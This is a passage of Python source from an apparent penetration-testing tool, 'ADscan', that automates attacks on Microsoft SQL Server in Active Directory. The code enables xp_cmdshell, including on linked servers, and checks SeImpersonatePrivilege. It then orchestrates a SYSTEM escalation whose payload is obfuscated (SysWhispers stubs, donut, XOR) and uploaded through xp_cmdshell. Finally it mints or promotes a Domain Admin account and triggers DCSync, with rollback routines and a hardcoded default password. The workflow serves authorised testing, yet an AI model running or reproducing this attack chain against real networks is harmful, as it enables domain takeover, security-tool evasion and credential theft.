        """Restore xp_cmdshell to its pre-engagement state if WE enabled it.

        ADscan must always leave the SQL Server configuration as it was found.
        This runs on EVERY workflow exit — including the usable/success path
        where xp_cmdshell was enabled and used — not only when the enable turned
        out unusable. Idempotent: a no-op when we did not enable it (or already
        reverted), so it is safe to call from multiple exit points.
        """
        nonlocal enabled_by_us
        if not enabled_by_us:
            return
        print_info_debug(
            f"Reverting xp_cmdshell on {marked_host} to its pre-engagement state "
            "(ADscan enabled it; restoring the original configuration)."
        )
        try:
            revert_result = backend.disable_xp_cmdshell(
                domain=domain,
                username=username,
                secret=password,
                restore_advanced_options=original_advanced_on,
                timeout=60,
            )
            if getattr(revert_result, "success", False):
                print_info_debug(
                    f"xp_cmdshell reverted to disabled on {marked_host}."
                )
            else:
                print_warning(
                    f"xp_cmdshell revert was NOT confirmed on {marked_host} — "
                    "verify the SQL Server configuration manually."
                )
        except Exception as exc:  # noqa: BLE001 - revert is best-effort hygiene
            telemetry.capture_exception(exc)
            print_warning(f"xp_cmdshell revert raised on {marked_host}: {exc}.")
        finally:
            enabled_by_us = False

    # Ground-truth usability: sysadmin is always usable when enabled; otherwise
    # probe by running a benign command (single probe).
    xp_usable = xp_enabled and (
        sweep.is_sysadmin
        or _verify_xp_cmdshell_executable(
            backend,
            domain=domain,
            username=username,
            secret=password,
        )
    )
    print_info_debug(
        f"xp_cmdshell usability for {marked_user} on {marked_host}: "
        f"enabled={xp_enabled}, usable={xp_usable}, enabled_by_us={enabled_by_us}."
    )

    if xp_enabled and xp_usable:
        execution_path = MssqlExecutionPath(
            mode="xp_cmdshell",
            identity=sweep.identity.system_user or None,
        )
    else:
        # We changed server config but the path is not usable (e.g. enabled
        # via serveradmin but the proxy account is missing, so execution still
        # denies). Revert our change so we do not leave xp_cmdshell on for
        # nothing, then fall through to the remaining checks.
        _revert_xp_cmdshell_if_we_enabled()
        print_info(
            "No usable local xp_cmdshell path; checking linked-server / "
            "impersonation paths."
        )

    if execution_path is None and sweep.linked_servers:
        linked_names = [ls.name for ls in sweep.linked_servers]
        persisted_path = _persist_mssql_linked_servers(
            shell,
            domain=domain,
            host=host,
            username=username,
            linked_servers=linked_names,
        )
        print_info(
            f"Persisted linked-server inventory to {mark_sensitive(persisted_path, 'path')}."
        )
        _ls_tree_lines: list[str] = []
        for _ls_idx, _ls_name in enumerate(linked_names):
            _ls_connector = "├─" if _ls_idx < len(linked_names) - 1 else "└─"
            _ls_tree_lines.append(
                f"  {_ls_connector} {mark_sensitive(_ls_name, 'hostname')}"
            )
        _ls_tree_body = "\n".join(_ls_tree_lines)
        print_info(
            f"[bold]{marked_host}[/bold] has {len(linked_names)} linked server(s):\n"
            f"{_ls_tree_body}"
        )
        for linked in sweep.linked_servers:
            marked_link = mark_sensitive(linked.name, "hostname")
            print_info(
                f"Attempting linked-server xp_cmdshell enablement on {marked_link}."
            )
            link_enable = backend.enable_xp_cmdshell(
                domain=domain,
                username=username,
                secret=password,
                linked_server=linked.name,
                timeout=60,
            )
            if not link_enable.success:
                print_warning(
                    "Linked-server xp_cmdshell enablement was not confirmed on "
                    f"{marked_link}."
                )
                continue
            print_success(
                f"xp_cmdshell enabled successfully on linked server {marked_link}."
            )
            whoami_exec = backend.execute_command(
                domain=domain,
                username=username,
                secret=password,
                command="whoami",
                host=host,
                linked_server=linked.name,
                timeout=120,
            )
            if not whoami_exec.success or not whoami_exec.stdout_lines:
                print_warning(
                    "Linked-server command validation did not succeed on "
                    f"{marked_link}. Trying the next linked server."
                )
                continue
            identity = whoami_exec.stdout_lines[0].strip()
            print_success(
                f"[bold]Execution path confirmed[/bold]: "
                f"{marked_host} -> {marked_link} "
                f"as [bold]{mark_sensitive(identity, 'user') if identity else 'unknown'}[/bold]."
            )
            execution_path = MssqlExecutionPath(
                mode="linked_xpcmd",
                linked_server=linked.name,
                identity=identity or None,
            )
            break

    if execution_path is None:
        print_warning(
            "No MSSQL command-execution path was established. Falling back to impersonation checks only."
        )
        run_mssql_check_impersonate(
            shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
        )
        _revert_xp_cmdshell_if_we_enabled()
        return {
            "completed": True,
            "execution_available": False,
        }

    if execution_path.identity:
        _mode_label = (
            "local xp_cmdshell"
            if execution_path.mode == "xp_cmdshell"
            else f"linked server ({mark_sensitive(execution_path.linked_server or '', 'hostname')})"
        )
        print_info(
            f"Running as [bold]{mark_sensitive(execution_path.identity, 'user')}[/bold] "
            f"via {_mode_label}."
        )

    if workflow_intent in {"default", "pivot_search", "pivot_relaunch"}:
        check_pivot_reachability_via_mssql(
            shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
            execution_path=execution_path,
            offer_post_pivot_owned_followup=(workflow_intent != "pivot_relaunch"),
        )
    # Escalate first (SeImpersonate -> SYSTEM): the highest-value step. The
    # MSSQL-level filesystem / sensitive-data search is a FALLBACK — run it only
    # when the escalation did NOT obtain elevated access (SeImpersonate absent,
    # declined, or the takeover failed). When we reach SYSTEM/DA, the loot comes
    # from that surface, so the MSSQL filesystem search is skipped.
    escalated = run_mssql_check_impersonate(
        shell,
        domain=domain,
        host=host,
        username=username,
        password=password,
    )
    mapping_result = None
    if not escalated:
        print_info(
            "No SYSTEM escalation from this surface; running the MSSQL filesystem "
            "sensitive-data search as a fallback."
        )
        mapping_result = _run_mssql_filesystem_mapping(
            shell,
            domain=domain,
            host=host,
            username=username,
            password=password,
            execution_path=execution_path,
        )
    # Engagement done with the local xp_cmdshell path: restore the config if we
    # enabled it (success path included) — ADscan always leaves the system as
    # it was found.
    _revert_xp_cmdshell_if_we_enabled()
    return {
        "completed": True,
        "execution_available": True,
        "execution_mode": execution_path.mode,
        "linked_server": execution_path.linked_server,
        "filesystem_mapping": mapping_result,
    }


def run_mssql_check_impersonate(
    shell: MssqlShell, *, domain: str, host: str, username: str, password: str
) -> bool:
    """Check SeImpersonatePrivilege via MSSQL and trigger follow-up prompt."""
    marked_host = mark_sensitive(host, "hostname")
    marked_username = mark_sensitive(username, "user")
    print_operation_header(
        "MSSQL SeImpersonate Check",
        details={
            "Domain": domain,
            "Host": host,
            "Username": username,
            "Command": "whoami /priv",
        },
        icon="🧩",
    )
    print_info(f"Checking SeImpersonate privileges on host {marked_host}")

    service = ExploitationService()
    posture_snapshot = None
    posture_sink = None
    kdc_host = None
    try:
        from adscan_internal.models.domain import resolve_dc_ip
        from adscan_internal.services.domain_posture import get_posture
        from adscan_internal.services.posture_sink import (
            make_workspace_posture_sink,
        )

        domains_data = getattr(shell, "domains_data", None)
        if isinstance(domains_data, dict):
            posture_snapshot = get_posture(domains_data, domain=domain)
            posture_sink = make_workspace_posture_sink(domains_data)
            # DC/KDC IP so impacket's self-minted Kerberos requests reach the
            # KDC without relying on container AD DNS.
            kdc_host = resolve_dc_ip(domains_data.get(domain) or {})
    except Exception as posture_exc:
        telemetry.capture_exception(posture_exc)

    result = service.mssql.check_seimpersonate(
        host=host,
        username=username,
        password=password,
        domain=domain,
        timeout=60,
        posture_snapshot=posture_snapshot,
        posture_sink=posture_sink,
        domain_for_posture=domain,
        kdc_host=kdc_host,
    )

    try:
        properties = {"has_privilege": bool(result.has_privilege)}
        properties.update(build_lab_event_fields(shell=shell, include_slug=True))
        telemetry.capture("mssql_seimpersonate_checked", properties)
    except Exception as e:  # pragma: no cover
        telemetry.capture_exception(e)

    if result.has_privilege:
        _seimpers_body = RichText.assemble(
            (
                "SeImpersonatePrivilege confirmed for ",
                _COLOR_MUTED,
            ),
            (mark_sensitive(username, "user"), f"bold {_COLOR_CRIMSON}"),
            (" on ", _COLOR_MUTED),
            (mark_sensitive(host, "hostname"), f"bold {_COLOR_STEEL}"),
            ("\n\n", ""),
            ("This account can impersonate SYSTEM via a potato-class exploit.\n", _COLOR_MUTED),
            ("Next: run the takeover to escalate to SYSTEM-equivalent access.", _COLOR_MUTED),
        )
        print_panel(
            _seimpers_body,
            title=RichText.assemble(
                (" SeImpersonatePrivilege ", f"bold black on {_COLOR_CRIMSON}"),
                ("  local privilege escalation path confirmed", _COLOR_MUTED),
            ),
            border_style=_COLOR_CRIMSON,
            box=_BOX_ROUNDED,
            padding=(1, 2),
        )
        escalated = shell.ask_for_mssql_impersonate(domain, host, username, password)
        return bool(escalated)

    print_warning(
        f"SeImpersonatePrivilege not detected on {marked_host} "
        f"for {marked_username}."
    )
    return False


def run_mssql_impersonate(
    shell: MssqlShell, *, domain: str, host: str, username: str, password: str
) -> bool:
    """SeImpersonate→SYSTEM via Stealth Payload v3 (adscan_potato).

    Delegates to :func:`run_mssql_takeover` — the legacy name is retained
    so existing call sites in the shell protocol continue to work without
    change.  New code should call :func:`run_mssql_takeover` directly.
    Returns whether the escalation succeeded.
    """
    return run_mssql_takeover(
        shell, domain=domain, host=host, username=username, password=password
    )


def _classify_minted_secret_kind(secret: str) -> str:
    """Classify a minted account secret for transport config builders.

    Delegates to the SSOT ``native_account_cleanup.classify_secret_kind`` so the
    minted-account LDAP-delete and remote-exec paths share one classifier.
    Returns one of ``"password"`` / ``"nt_hash"`` / ``"ccache"``.
    """
    from adscan_internal.services.native_account_cleanup import classify_secret_kind

    return classify_secret_kind(secret)


def _delete_minted_account_via_ldap(
    shell: MssqlShell,
    *,
    domain: str,
    admin_username: str,
    admin_password: str,
) -> bool:
    """Delete a freshly-minted DOMAIN account via native LDAP, as that account.

    A brand-new Domain Admin has full LDAP rights but is NOT a SQL sysadmin
    login, so it cannot run ``xp_cmdshell``. Thin wrapper over the SSOT
    ``native_account_cleanup.delete_domain_account_via_ldap`` (the same helper the
    HasSession del-user rollback uses): binds AS the minted account over the
    canonical LDAPS->LDAP fallback transport, resolves the DN by sAMAccountName
    and deletes it. Returns True only when the object is confirmed gone.
    """
    from adscan_internal.services.native_account_cleanup import (  # noqa: PLC0415
        delete_domain_account_via_ldap,
    )

    marked = mark_sensitive(admin_username, "user")
    marked_domain = mark_sensitive(domain, "domain")

    ok = delete_domain_account_via_ldap(
        domains_data=getattr(shell, "domains_data", None) or {},
        domain=domain,
        username=admin_username,
        secret=admin_password,
    )
    if not ok:
        print_info_debug(
            f"[mssql][revert] native LDAP delete of {marked} on {marked_domain} "
            "did not confirm."
        )
    return ok


def _delete_minted_account_via_remote_exec(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    admin_username: str,
    admin_password: str,
    kdc_ip: str | None = None,
) -> bool:
    """Delete a minted account by running ``net user /delete`` via remote-exec.

    Uses the centralized native remote-execution cascade (SMBEXEC -> ATEXEC ->
    ...) with the minted account's own credential (local Administrator on a
    member server, or the Domain Admin used as a fallback on a DC). Returns True
    only when the command output confirms completion.
    """
    from adscan_internal.models.domain import resolve_dc_fqdn  # noqa: PLC0415
    from adscan_internal.services.async_bridge import run_async_sync  # noqa: PLC0415
    from adscan_internal.services.remote_exec import (  # noqa: PLC0415
        build_smb_config_from_credential,
        execute_with_fallback,
    )

    marked = mark_sensitive(admin_username, "user")
    marked_host = mark_sensitive(host, "hostname")
    secret_kind = _classify_minted_secret_kind(admin_password)

    domain_record = (getattr(shell, "domains_data", None) or {}).get(domain) or {}
    # For a ccache/Kerberos credential the SPN host must be an FQDN; otherwise
    # the provided host (IP or name) is used directly for the SMB connection.
    target_host = (
        resolve_dc_fqdn(domain_record, target_domain=domain)
        if secret_kind == "ccache"
        else host
    ) or host

    try:
        config = build_smb_config_from_credential(
            domain=domain,
            username=admin_username,
            secret=admin_password,
            secret_kind=secret_kind,  # type: ignore[arg-type]
            target_host=target_host,
            target_ip=host,
            kdc_ip=kdc_ip,
        )
    except ValueError as exc:
        telemetry.capture_exception(exc)
        print_info_debug(
            f"[mssql][revert] remote-exec config build failed for {marked}: {exc}"
        )
        return False

    workspace_type = str(getattr(shell, "type", "") or "").strip().lower() or None

    async def _run() -> bool:
        result = await execute_with_fallback(
            config,
            f"net user {admin_username} /delete",
            workspace_type=workspace_type,
            timeout=60,
        )
        combined = f"{result.stdout or ''}\n{result.stderr or ''}".lower()
        return bool(result.success) and "command completed" in combined

    try:
        return bool(run_async_sync(_run()))
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_info_debug(
            f"[mssql][revert] remote-exec delete of {marked} on {marked_host} failed: {exc}"
        )
        return False


def _auto_revert_minted_account(
    shell: MssqlShell,
    *,
    backend: Any,
    domain: str,
    host: str,
    admin_username: str,
    admin_password: str,
    ledger: Any = None,
    change_id: str | None = None,
    mode: str = "created",
    already_member: bool = False,
    pdc_host: str | None = None,
    scope: str = "local",
    kdc_ip: str | None = None,
) -> None:
    """Roll back the post-ex change after the credential pipeline finishes.

    Mode-aware and SAFETY-CRITICAL:

      ``mode == "created"`` (a brand-new account was minted):
        Delete the account using a credential-driven path that does NOT depend
        on a SQL sysadmin login (a freshly-minted Domain Admin is not mapped to
        MSSQL ``sysadmin``, so ``xp_cmdshell`` is denied to it):

          * ``scope == "domain"`` (DC path) — PRIMARY: native LDAP delete via
            the minted DA credential (most reliable on a DC whose command-exec
            is unstable). FALLBACK: ``net user <u> /delete`` through the native
            remote-exec cascade with the same DA credential.
          * ``scope == "local"`` (member server) — the native remote-exec
            cascade runs ``net user <u> /delete`` with the minted
            local-admin credential.

      ``mode == "promoted"`` (an already-controlled EXISTING user was added to
      Domain Admins):
        NEVER delete the user — it predates ADscan. Instead remove ONLY the
        Domain Admins membership WE added, and only when ``already_member`` is
        False. When ``already_member`` is True the user was a Domain Admin
        before we touched it, so the exact prior state requires doing NOTHING.

    Loud on failure: a created account must never be left behind silently, and a
    membership we added must be removed.
    """
    marked = mark_sensitive(admin_username, "user")
    marked_host = mark_sensitive(host, "hostname")
    marked_domain = mark_sensitive(domain, "domain")

    # ── Promoted-existing-user path — group-membership removal only ──────────
    if mode == "promoted":
        if already_member:
            # The user was ALREADY a Domain Admin before we touched it. Removing
            # the membership would corrupt the prior state — do nothing.
            print_info(
                f"Revert: {marked} was already a Domain Admin in {marked_domain} "
                "before this operation — leaving its membership untouched."
            )
            if ledger is not None and change_id:
                try:
                    ledger.mark_reverted(change_id)
                except Exception as exc:  # noqa: BLE001
                    telemetry.capture_exception(exc)
            return
        print_info(
            f"Revert: removing {marked} from Domain Admins in {marked_domain} "
            "(the existing account itself is preserved)..."
        )
        removed = False
        try:
            from adscan_internal.services.exploitation import (  # noqa: PLC0415
                ExploitationService,
            )

            result = ExploitationService().acl.remove_group_member(
                pdc_host=pdc_host or host,
                domain=domain,
                username=admin_username,
                password=admin_password,
                target_group="Domain Admins",
                target_username=admin_username,
                kerberos=str(admin_password or "").lower().endswith(".ccache"),
                target_domain=domain,
                timeout=300,
            )
            removed = bool(getattr(result, "success", False))
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
        if removed:
            print_success(
                f"{marked} removed from Domain Admins — prior state restored."
            )
            if ledger is not None and change_id:
                try:
                    ledger.mark_reverted(change_id)
                except Exception as exc:  # noqa: BLE001
                    telemetry.capture_exception(exc)
            return
        print_warning(
            f"Auto-revert could NOT confirm removal of {marked} from Domain Admins "
            f"in {marked_domain}. Remove it manually — this membership was added "
            f"by ADscan and must not be left behind."
        )
        if ledger is not None and change_id:
            try:
                ledger.mark_failed(
                    change_id,
                    error="auto-revert Domain Admins removal not confirmed",
                    manual_cleanup_instructions=(
                        f'Remove-ADGroupMember -Identity "Domain Admins" '
                        f"-Members '{admin_username}' -Confirm:$false"
                    ),
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
        return

    # ── Created-account path — credential-driven delete (no MSSQL/xp_cmdshell) ─
    # A freshly-minted Domain Admin is NOT a SQL sysadmin login, so it cannot
    # run ``xp_cmdshell`` (the EXECUTE permission is denied). Delete it instead
    # through its OWN privileged credential: native LDAP on a DC, native
    # remote-exec on a member server.
    _ = backend  # retained for signature/call-site compatibility; no longer used
    print_info(
        f"Auto-revert: removing the minted account {marked} on {marked_host}..."
    )
    ok = False
    is_domain_scope = str(scope or "").strip().lower() == "domain"
    if is_domain_scope:
        # PRIMARY on a DC: native LDAP delete (robust even when command-exec is
        # unstable). FALLBACK: remote-exec ``net user /delete`` with the DA cred.
        ok = _delete_minted_account_via_ldap(
            shell,
            domain=domain,
            admin_username=admin_username,
            admin_password=admin_password,
        )
        if ok:
            print_success(
                f"Minted account {marked} deleted via LDAP — environment left clean."
            )
        else:
            print_warning(
                f"LDAP delete of {marked} on {marked_domain} was not confirmed; "
                "attempting remote-exec 'net user /delete' as a fallback..."
            )
            ok = _delete_minted_account_via_remote_exec(
                shell,
                domain=domain,
                host=host,
                admin_username=admin_username,
                admin_password=admin_password,
                kdc_ip=kdc_ip,
            )
            if ok:
                print_success(
                    f"Minted account {marked} deleted via remote-exec — "
                    "environment left clean."
                )
    else:
        # Member server: local account → remote-exec ``net user /delete`` with
        # the minted local-admin credential.
        ok = _delete_minted_account_via_remote_exec(
            shell,
            domain=domain,
            host=host,
            admin_username=admin_username,
            admin_password=admin_password,
            kdc_ip=kdc_ip,
        )
        if ok:
            print_success(
                f"Minted account {marked} deleted via remote-exec — "
                "environment left clean."
            )
    if ok:
        if ledger is not None and change_id:
            try:
                ledger.mark_reverted(change_id)
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
        return
    print_warning(
        f"Auto-revert could NOT confirm deletion of {marked} on {marked_host}. "
        f"Remove it manually — this account must not be left in the environment "
        f"(adscan mssql takeover {host} --revert)."
    )
    if ledger is not None and change_id:
        try:
            ledger.mark_failed(
                change_id,
                error="auto-revert account deletion not confirmed",
                manual_cleanup_instructions=(
                    f'Remove-ADUser -Identity "{admin_username}" -Confirm:$false'
                    if is_domain_scope
                    else f"net user {admin_username} /delete on {host}"
                ),
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)


def _default_minted_identity(
    shell: MssqlShell, *, domain: str, username: str, password: str
) -> tuple[str, str]:
    """Generate a recognizable timestamped name + a policy-compliant password.

    Thin wrapper over the shared
    :func:`adscan_internal.services.exploitation.minted_account_identity.default_minted_identity`
    (single source of truth; reused by the RBCD relay verb). Kept as a
    module-local name so existing callers and tests inside ``mssql`` keep
    working unchanged.
    """
    from adscan_internal.services.exploitation.minted_account_identity import (  # noqa: PLC0415
        default_minted_identity,
    )

    return default_minted_identity(
        shell, domain=domain, username=username, password=password
    )


def _prompt_minted_account_identity(
    shell: MssqlShell, *, default_username: str, default_password: str
) -> tuple[str, str]:
    """Let the operator review/override the minted account name + password.

    Thin wrapper over the shared
    :func:`adscan_internal.services.exploitation.minted_account_identity.prompt_minted_account_identity`.
    Non-interactive runs auto-resolve to the defaults (never blocks CI).
    """
    from adscan_internal.services.exploitation.minted_account_identity import (  # noqa: PLC0415
        prompt_minted_account_identity,
    )

    return prompt_minted_account_identity(
        shell, default_username=default_username, default_password=default_password
    )


def _select_takeover_da_target(
    shell: MssqlShell,
    *,
    domain: str,
    fallback_username: str,
    fallback_password: str,
) -> tuple[bool, str, str, bool] | None:
    """Choose how to escalate to Domain Admin on a DC takeover.

    Presents a two-way operator choice (mirrors the HasSession flow):

      * Create a brand-new domain account, then add it to Domain Admins.
      * Promote an already-controlled existing domain user to Domain Admins.

    Returns a tuple ``(create_new, admin_username, admin_password,
    already_member)`` or ``None`` when the operator cancels. Non-interactive
    runs auto-resolve to create-new (preserving the legacy behavior).

    ``already_member`` is meaningful only for the promote path: it records
    whether the selected user was ALREADY a Domain Admin before this operation,
    so the mode-aware revert can restore the exact prior state (never removing a
    pre-existing membership).
    """
    from adscan_core.interaction import is_non_interactive  # noqa: PLC0415

    # Non-interactive (or no selection UI) → preserve legacy create-new behavior.
    if is_non_interactive(shell) or not hasattr(shell, "_questionary_select"):
        return True, fallback_username, fallback_password, False

    options = [
        "Create a new domain account, then add it to Domain Admins (Recommended)",
        "Add an already-controlled domain user to Domain Admins",
        "Cancel",
    ]
    choice = shell._questionary_select(
        "MSSQL takeover — Domain Admin escalation mode:",
        options,
        default_idx=0,
    )
    if choice is None or choice >= len(options) - 1:
        return None
    if choice == 0:
        return True, fallback_username, fallback_password, False

    # ── Promote an existing already-controlled domain user ───────────────────
    from adscan_internal.services.attack_graph_service import (  # noqa: PLC0415
        get_owned_domain_usernames,
    )

    owned_users = get_owned_domain_usernames(shell, domain)
    selected_user = ""
    if owned_users:
        sel_options = owned_users + ["Enter username", "Cancel"]
        sel_idx = shell._questionary_select(
            "Select the controlled domain user to add to Domain Admins:",
            sel_options,
            default_idx=0,
        )
        if sel_idx is None or sel_idx >= len(sel_options) - 1:
            return None
        if sel_idx == len(sel_options) - 2:
            from adscan_core.output import prompt_ask  # noqa: PLC0415

            selected_user = (prompt_ask("Existing domain username", default="") or "").strip()
        else:
            selected_user = sel_options[sel_idx]
    else:
        from adscan_core.output import prompt_ask  # noqa: PLC0415

        selected_user = (prompt_ask("Existing domain username", default="") or "").strip()

    if not selected_user:
        print_warning("No existing user selected — cancelling takeover.")
        return None

    # Reuse the credential we already hold for this user (password or hash) —
    # never prompt for or generate one.
    domains_data = getattr(shell, "domains_data", None) or {}
    stored_creds = ((domains_data.get(domain) or {}).get("credentials") or {})
    secret = stored_creds.get(selected_user)
    if secret is None:
        # Case-insensitive fallback lookup.
        for stored_user, stored_secret in stored_creds.items():
            if str(stored_user).strip().lower() == selected_user.strip().lower():
                selected_user = str(stored_user)
                secret = stored_secret
                break
    if secret is None:
        print_warning(
            f"No stored credential found for {mark_sensitive(selected_user, 'user')} "
            f"in {mark_sensitive(domain, 'domain')} — cannot promote it. Cancelling."
        )
        return None

    # SAFETY: determine whether the user is ALREADY a Domain Admin BEFORE we add
    # it. The mode-aware revert reads this to avoid removing a pre-existing
    # membership. An inconclusive probe (``None``) is treated conservatively as
    # "already a member" so revert never strips a membership we cannot prove we
    # added.
    already_member = True
    try:
        from adscan_internal.services.native_group_membership import (  # noqa: PLC0415
            is_principal_member_of_rid_native,
        )

        probe = is_principal_member_of_rid_native(
            shell,
            domain,
            selected_user,
            512,
            operation_name="MSSQL takeover pre-add Domain Admins membership check",
        )
        if probe is None:
            print_warning(
                f"Could not confirm whether {mark_sensitive(selected_user, 'user')} is "
                "already a Domain Admin; revert will NOT remove the membership to avoid "
                "corrupting prior state."
            )
            already_member = True
        else:
            already_member = bool(probe)
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        already_member = True

    return False, str(selected_user), str(secret), already_member


def run_mssql_takeover(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    admin_username: str = "test",
    admin_password: str = "Password123!",
    revert: bool = False,
    no_revert: bool = False,
) -> bool:
    """SeImpersonate→SYSTEM via Stealth Payload v3 (``adscan mssql takeover``).

    Replaces the old SigmaPotato/ps-encoder.py flow with the native
    :class:`SeImpersonateOrchestrator` pipeline:

        1. AV/EDR fingerprint via aiosmb (SMB registry probe + pipe enum).
        2. Defensive-posture-aware payload selection (OPEN/STANDARD/HARDENED/PARANOID).
        3. Build: SysWhispers4 stubs → mingw cross-compile → donut wrap → XOR encrypt.
        4. Upload ``adscan_potato.exe`` in base64 chunks via ``xp_cmdshell``.
        5. Execute → parse ``ADSCAN_POTATO_SUCCESS`` sentinel.
        6. Proof collection + outcome card with mandatory revert reminder.
    """
    from adscan_internal.services.exploitation.seimpersonate import (
        SeImpersonateOrchestrator,
    )
    from adscan_internal.integrations.mssql import ImpacketMSSQLBackend
    from adscan_internal.models.domain import resolve_dc_ip
    from adscan_internal.services.smb_transport import SMBConfig

    marked_host = mark_sensitive(host, "hostname")
    if revert:
        print_info(f"Reverting takeover on {marked_host}...")
    else:
        print_info(f"Starting MSSQL takeover on {marked_host}...")

    _kdc_host = resolve_dc_ip(
        (getattr(shell, "domains_data", None) or {}).get(domain) or {}
    )
    backend = ImpacketMSSQLBackend(host=host, domain=domain, kdc_host=_kdc_host)

    # Domain-Controller detection — computed UP FRONT so the escalation-mode
    # choice and the identity prompt below can depend on it. When the SQL host
    # IS the DC, ``net user``/``net group`` operate on the DOMAIN database, so
    # the escalated account is a DOMAIN account added to "Domain Admins" and the
    # credential is registered as a DOMAIN credential. Compare the target host
    # against the resolved DC FQDN/IP.
    from adscan_internal.models.domain import resolve_dc_fqdn  # noqa: PLC0415

    _domain_record = (getattr(shell, "domains_data", None) or {}).get(domain) or {}
    _dc_fqdn = str(resolve_dc_fqdn(_domain_record, target_domain=domain) or "").lower()
    _host_l = str(host or "").lower()
    is_dc = bool(_host_l) and (
        _host_l == _dc_fqdn
        or (bool(_kdc_host) and _host_l == str(_kdc_host).lower())
        or (bool(_dc_fqdn) and _host_l.split(".", 1)[0] == _dc_fqdn.split(".", 1)[0])
    )

    # Escalation mode. ``create_new`` mints a brand-new account; ``promoted``
    # adds an already-controlled existing user to Domain Admins (DC path only,
    # less noisy). ``already_member`` records whether a promoted user was a
    # Domain Admin before this operation — read by the mode-aware revert.
    create_new = True
    already_member = False
    if not revert:
        # Resolve the create-new default identity once (recognizable,
        # policy-compliant; operator-overridable) — used for the create path.
        if admin_username == "test" and admin_password == "Password123!":
            _gen_name, _gen_pw = _default_minted_identity(
                shell, domain=domain, username=username, password=password
            )
        else:
            _gen_name, _gen_pw = admin_username, admin_password

        if is_dc:
            selection = _select_takeover_da_target(
                shell,
                domain=domain,
                fallback_username=_gen_name,
                fallback_password=_gen_pw,
            )
            if selection is None:
                print_info("MSSQL takeover cancelled by operator.")
                return
            create_new, admin_username, admin_password, already_member = selection
            if create_new:
                # Let the operator review/override the minted identity.
                admin_username, admin_password = _prompt_minted_account_identity(
                    shell, default_username=admin_username, default_password=admin_password
                )
        else:
            # Member server: create-new only (no Domain Admins promotion path).
            admin_username, admin_password = _prompt_minted_account_identity(
                shell, default_username=_gen_name, default_password=_gen_pw
            )

    # Build an SMB config for the AV/EDR fingerprint (best-effort, informational).
    smb_config = None
    try:
        smb_config = SMBConfig(  # pylint: disable=unexpected-keyword-arg
            target_ip=host,
            domain=domain,
            username=username,
            password=password if not is_hash_authentication(password) else None,
            nthash=password if is_hash_authentication(password) else None,
            use_kerberos=str(password).lower().endswith(".ccache"),
        )
    except Exception as exc:  # noqa: BLE001
        print_info_debug(
            f"[mssql_takeover] SMB config failed: {exc} — fingerprint skipped"
        )

    orchestrator = SeImpersonateOrchestrator(shell)

    # Capture starting identity from a quick whoami via xp_cmdshell.
    target_identity = ""
    try:
        id_result = backend.execute_command(
            domain=domain,
            username=username,
            secret=password,
            command="whoami",
            host=host,
            timeout=15,
        )
        if id_result.stdout_lines:
            target_identity = id_result.stdout_lines[0].strip()
    except Exception:  # noqa: BLE001
        pass

    outcome = orchestrator.run(
        mssql_backend=backend,
        smb_config=smb_config,
        domain=domain,
        username=username,
        secret=password,
        admin_username=admin_username,
        admin_password=admin_password,
        host=host,
        is_dc=is_dc,
        create_user=create_new,
        target_identity=target_identity,
        revert=revert,
    )

    if outcome.success and not revert:
        mode = "created" if create_new else "promoted"
        # Track the change in the env-change ledger for crash-safe rollback,
        # then run the credential pipeline, then auto-revert. The ledger detail
        # carries the mode + already_member so a crash-recovery sweep picks the
        # same safe revert action.
        ledger = getattr(shell, "environment_change_ledger", None)
        change_id = None
        if ledger is not None:
            try:
                change_id = ledger.register_change(
                    kind="mssql_postex_account",
                    domain=domain,
                    target=host,
                    detail={
                        "account": admin_username,
                        "scope": "domain" if is_dc else "local",
                        "group": "Domain Admins" if is_dc else "Administrators",
                        "mode": mode,
                        "already_member": already_member,
                    },
                    method=(
                        "mssql_seimpersonate_mint"
                        if create_new
                        else "mssql_seimpersonate_promote"
                    ),
                )
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)
        # Hand the credential to the NORMAL credential pipeline via
        # add_credential — never the registry-dump follow-up. add_credential
        # stores the credential and runs the right follow-ups itself:
        #   DC     -> host=None => DOMAIN credential; the pipeline detects the
        #             Domain-Admin status and drives DCSync / flag collection.
        #             (Dumping SAM/LSA on a DC we already own as DA is pointless.)
        #   Member -> host=host => LOCAL credential; the pipeline decides the
        #             appropriate local follow-ups.
        # For a promoted EXISTING user, force a privilege re-check: the user was
        # likely assessed earlier this session (it is already in our credential
        # store), and only a forced re-enumeration surfaces its new Domain-Admin
        # status → DCSync / flag follow-ups.
        try:
            shell.add_credential(
                domain,
                admin_username,
                admin_password,
                host=None if is_dc else host,
                pdc_ip=_kdc_host or None,
                prompt_for_user_privs_after=True,
                credential_origin="mssql_seimpersonate",
                force_recheck_user_privs=not create_new,
            )
        finally:
            # Automatic rollback AFTER the credential pipeline has consumed the
            # account (DCSync / flag collection / dump complete). Disable with
            # ``no_revert`` for engagements that deliberately keep the change.
            if not no_revert:
                _auto_revert_minted_account(
                    shell,
                    backend=backend,
                    domain=domain,
                    host=host,
                    admin_username=admin_username,
                    admin_password=admin_password,
                    ledger=ledger,
                    change_id=change_id,
                    mode=mode,
                    already_member=already_member,
                    pdc_host=_kdc_host or host,
                    scope="domain" if is_dc else "local",
                    kdc_ip=_kdc_host or None,
                )

    # Report whether this run actually escalated, so callers can gate follow-ups
    # (e.g. the filesystem search) on whether SYSTEM/DA access was obtained. A
    # revert run or a failed escalation returns False.
    return bool(outcome.success and not revert)


def ask_for_mssql_access(
    shell: MssqlShell,
    *,
    domain: str,
    host: str,
    username: str,
    password: str,
    workflow_intent: str = "default",
) -> None:
    """Ask user if they want to run the MSSQL post-auth workflow."""
    if (
        ensure_host_bound_workflow_target_viable(
            shell,
            domain=domain,
            target_host=host,
            workflow_label="MSSQL access workflow",
            service="mssql",
            resume_after_pivot=True,
        )
        is None
    ):
        return
    marked_host = mark_sensitive(host, "hostname")
    marked_user = mark_sensitive(username, "user")
    if Confirm.ask(
        "Do you want to run the MSSQL post-auth workflow on "
        f"{marked_host} with {marked_user}?",
        default=False,
    ):
        run_mssql_postauth_workflow(
            shell,
